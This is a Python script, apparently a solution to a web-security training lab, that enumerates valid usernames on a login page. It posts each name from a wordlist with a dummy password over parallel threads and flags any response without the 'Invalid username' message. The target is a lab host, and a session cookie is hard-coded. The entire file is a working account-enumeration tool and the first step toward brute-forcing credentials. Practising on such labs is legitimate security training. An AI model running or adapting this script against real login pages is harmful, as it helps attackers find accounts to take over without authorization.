import requests
from threading import Thread
from time import sleep

def fetchUsername(filename):
    listUsername = list()

    with open(filename) as fd:
        for line in fd:
            listUsername.append(line.strip())

    return listUsername

def sendRequest(url, cookie, username):
    loginData = {
        'username': username,
        'password': 'anything'
    }

    loginRequestText = requests.post(url, cookies=cookie, data=loginData).text

    if 'Invalid username' not in loginRequestText:
        print(f'[+] Found user: {username}')

def main():
    url = 'https://0a00007d038685c080e1e95c00d50037.web-security-academy.net/login'
    cookie = {'session': 'RPWFpOinGRvubwz1EhP0v3X5YWsY2yjH'}

    userFileName = './username.txt'
    listUsername = fetchUsername(userFileName)
    
    for username in listUsername:
        thread = Thread(target=sendRequest, args=(url, cookie, username))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()